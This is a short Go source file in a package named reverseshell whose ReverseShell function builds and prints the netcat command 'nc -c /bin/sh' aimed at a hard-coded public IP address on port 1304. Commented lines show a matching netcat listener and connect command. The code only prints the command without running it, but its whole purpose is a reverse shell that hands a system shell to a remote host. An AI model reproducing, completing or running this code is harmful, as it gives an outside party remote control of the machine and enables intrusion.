package reverseshell

import (
	"fmt"
	// "myapp/lib/sysinfo"
)

func ReverseShell() {
	// externalip, err := sysinfo.GetExtIP()
	// if err != nil {
	// 	return
	// }
	targetip := "217.142.235.125"
	targetcmd := "nc -c /bin/sh " + targetip + " 1304"
	fmt.Println("Target command:", targetcmd)

	// ncat -v -lp 8081 //listener
	// nc -v 192.168.0.164 8081
}
